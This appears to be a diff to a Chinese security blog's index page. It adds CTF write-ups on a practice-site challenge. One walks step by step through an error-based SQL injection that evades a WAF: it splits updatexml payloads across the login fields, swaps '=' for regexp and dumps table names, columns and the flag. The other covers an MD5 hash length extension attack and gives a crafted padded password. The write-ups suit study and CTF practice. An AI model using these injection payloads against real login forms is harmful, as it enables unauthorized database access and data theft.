@@ -281,6 +281,200 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/29/CTF题目-加了料的报错注入/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen DY">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen's Bolg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/29/CTF题目-加了料的报错注入/" itemprop="url">CTF题目-加了料的报错注入</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-29T16:03:21+08:00">
+                2019-08-29
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  698字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>题目地址：<a href="http://www.shiyanbar.com/ctf/2011" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/2011</a></p>
+<h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h2><p>首先看题目，题目很明显给出了提示，本题是使用报错注入来解决的。</p>
+<p>进入网页解题，源码部分给出了查询数据库的命令，为<br><code>$sql=&quot;select * from users where username=&#39;$username&#39; and password=&#39;$password&#39;&quot;;</code></p>
+<p>同时题目是通过POST的方式来传输账号和密码的，首先在POST报文中尝试提供信息为<code>username=1+&amp;+password=1</code>，发送后网页端返回<code>Login failed</code></p>
+<p>尝试使用<code>username=&#39; or 1=1 %23&amp;password=1</code>进行注入，网页端反馈Sql injection detected，因此可以推断出服务器端对SQL的注入命令进行了筛选，也就是加了WAF</p>
+<h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>使用BURP抓取POST包进行fuzz分析，分别对username和password的内容进行测试，测试发现两者屏蔽的值并不相同</p>
+<p>首先对于username，分析结果如下图所示：</p>
+<img src="/2019/08/29/CTF题目-加了料的报错注入/2.png">
+
+<p>由返回长度可以知道信息，其中302是<code>Login failed</code>，238是<code>Sql injection detected</code>，235是<code>username unknow error</code>对于后两者相当于符号被屏蔽了，前者是可以使用的。因此可以看出在username字段不能使用#、-、=、(、)，但是最终要的是这里能用到exp和updatexml</p>
+<p>对于password，分析结果如下：</p>
+<img src="/2019/08/29/CTF题目-加了料的报错注入/1.png">
+
+<p>和前面相反，这里并没屏蔽()，因此可以选择在后面添加语句</p>
+<p>构造语句<code>username=&#39; or exp/*&amp;password=*/(~(select * from (select user()) a)) or &#39;</code>发现返回的语句并没有解析user()，而是原样报错返回了</p>
+<p>尝试使用updatexml构造语句<code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select user())),1) or &#39;</code>，可以发现网页返回了用户名<code>web8@localhost</code></p>
+<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>得到payload就可以开始注入了，首先构造一句话来得到表名字：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) or &#39;</code><br>结果发现出现了数据库注入报错，仔细观察发现是在password的内容端添加了一个等号，而前面测试过，等号是被屏蔽的，这时候可以想到使用正则表达式的指令regexp来代替等号，因此构造语句为：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())),1) or &#39;</code></p>
+<p>网页返回结果为<code>XPATH syntax error: &#39;:ffll44jj,users&#39;</code><br>因此成功得到表名为<code>ffll44jj</code></p>
+<p>接下来尝试获取字段名，同样的方法，构造语句：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select group_concat(column_name) from information_schema.columns where table_name regexp &#39;ffll44jj&#39;)),1) or &#39;</code></p>
+<p>网页成功返回<code>XPATH syntax error: &#39;:value&#39;</code><br>由此得知flag所在列的名称为value</p>
+<p>再次构造命令来获取列中的值：<br><code>username=&#39; or updatexml/*&amp;password=*/(1,concat(0x3a,(select value from ffll44jj)),1) or &#39;</code></p>
+<p>然后就可以成功得到flag为<code>XPATH syntax error: &#39;:flag{err0r_b4sed_sqli_+_hpf}&#39;</code></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/29/文件上传的简单介绍/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -428,6 +622,204 @@
 
 <p>这样网页再访问当前目录下的文件的时候，所有的<code>jpg</code>文件都会被解析为<code>php</code></p>
 <h2 id="修补文件上传漏洞的一些建议"><a href="#修补文件上传漏洞的一些建议" class="headerlink" title="修补文件上传漏洞的一些建议"></a>修补文件上传漏洞的一些建议</h2><p>1.文件上传的目录设置为不可执行<br>2.结合使用MIME Type来判断文件的类型<br>3.使用随机数改写文件名和文件路径<br>4.单独设置文件服务器的域名</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/09/CTF题目-哈希长度拓展攻击/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Chen DY">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen's Bolg">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/09/CTF题目-哈希长度拓展攻击/" itemprop="url">CTF题目-哈希长度拓展攻击</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-09T15:58:19+08:00">
+                2019-07-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/安全/" itemprop="url" rel="index">
+                    <span itemprop="name">安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  935字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>题目地址：<a href="http://www.shiyanbar.com/ctf/1848" target="_blank" rel="noopener">http://www.shiyanbar.com/ctf/1848</a></p>
+<p>Message authentication codes (MACs)是用于验证信息真实性的。一般的MAC算法是这样的：服务器把secret和message连接到一起，然后用消息摘要算法如MD5或SHA1取摘要。研究发现MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL等摘要算法受此攻击，但MD2、SHA-224和SHA-384不受此攻击。</p>
+<img src="/2019/07/09/CTF题目-哈希长度拓展攻击/1.png">
+
+<p>这是一张MD5算法的流程图，根据这张图我们可以把MD5算法的流程，简单分为下面几步：</p>
+<p>1.把消息分为n个消息块。<br>2.对最后一个消息块进行消息填充。<br>3.每个消息块会和一个输入量做运算，把运算结果作为下一个输入量。</p>
+<p>计算消息摘要必须用补位已经补长度完成之后的消息来进行运算，拿出 512 bit 的消息（即64 byte ）。 计算消息摘要的时候，有一个初始的链变量，用来参与第一轮的运算。MD5 的初始链变量为：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">A</span>=<span class="number">0</span>x67452301</span><br><span class="line"><span class="attr">B</span>=<span class="number">0</span>xefcdab89</span><br><span class="line"><span class="attr">C</span>=<span class="number">0</span>x98badcfe</span><br><span class="line"><span class="attr">D</span>=<span class="number">0</span>x10325476</span><br></pre></td></tr></table></figure>
+
+<p>无需关心计算细节，我们只需要知道经过一次消息再要后，上面的链变量将会被新的值覆盖，而最后一轮产生的链变量经过高低位互换（如：aabbccdd -&gt; ddccbbaa）后就是我们计算出来的 md5 值。</p>
+<h1 id="拓展攻击的实现"><a href="#拓展攻击的实现" class="headerlink" title="拓展攻击的实现"></a>拓展攻击的实现</h1><p>下面是一道CTF题目中获取的服务器端PHP代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;pre&gt;</span><br><span class="line">$flag = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line">$secret = <span class="string">"XXXXXXXXXXXXXXX"</span>; <span class="comment">// This secret is 15 characters long for security!</span></span><br><span class="line"></span><br><span class="line">$username = $_POST[<span class="string">"username"</span>];</span><br><span class="line">$password = $_POST[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode($username) === <span class="string">"admin"</span> &amp;&amp; urldecode($password) != <span class="string">"admin"</span>) &#123;<span class="comment"># ===俩边不管值还是类型都要一致</span></span><br><span class="line">        <span class="keyword">if</span> ($COOKIE[<span class="string">"getmein"</span>] === md5($secret . urldecode($username . $password))) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"The flag is "</span>. $flag);<span class="comment">#exit()/die() 函数输出一条消息，并退出当前脚本</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span> (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5($secret . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>($_COOKIE[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, <span class="number">0</span>, time() + (<span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">7</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ($_COOKIE[<span class="string">"source"</span>] != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">""</span>; <span class="comment">// This source code is outputted here</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line">&lt;h1&gt;Admins Only!&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;<span class="keyword">If</span> you have the correct credentials, log in below. <span class="keyword">If</span> not, please LEAVE.&lt;/p&gt;</span><br><span class="line">&lt;form method=<span class="string">"POST"</span>&gt;</span><br><span class="line">    Username: &lt;input type=<span class="string">"text"</span> name=<span class="string">"username"</span>&gt; &lt;br&gt;</span><br><span class="line">    Password: &lt;input type=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt; &lt;br&gt;</span><br><span class="line">    &lt;button type=<span class="string">"submit"</span>&gt;Submit&lt;/button&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>flag获取的要求是：传进一个cookie使getmein等于md5($secret . urldecode($username . $password))且后面部分不能为adminadmin,<br>也就是说需要构造getmein的cookie和他那串字符相同就可以。</p>
+<p>我们已知当username和password都等于admin时得到的MD5摘要值，想要构造一个password，能够知道得到的MD5值</p>
+<p>已知$secret长度为15，先进行消息的填充，前面的A是随便写的，为了占15个字符。填充如下:</p>
+<img src="/2019/07/09/CTF题目-哈希长度拓展攻击/2.png">
+
+<p>然后在后面跟加附加值，随便写什么：</p>
+<img src="/2019/07/09/CTF题目-哈希长度拓展攻击/3.png">
+
+<p>然后去掉前面原本的username值，剩余的就是需要输入的password值：</p>
+<p><code>adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00dawn</code></p>
+<p>urlencode之后为:<br><code>adminadmin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00dawn</code></p>
+<p>现在我们在不知道具体 $secret 的情况下，已经得知了md5(secert+adminadmin)的值为571580b26c65f306376d4f64e53cb5c7，以及​$sercret的位数。而我们得到的 hash 值正是下一轮摘要经过高地位互换的链变量。</p>
+<p>在网上找到计算MD5的代码，只要把初始向量变成已知的那个HASH值就可以了。</p>
 
           
         
@@ -1616,7 +2008,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1638,7 +2030,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
@@ -1689,7 +2081,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">9.7k</span>
+    <span title="Site words total count">11.3k</span>
   
 </div>
 
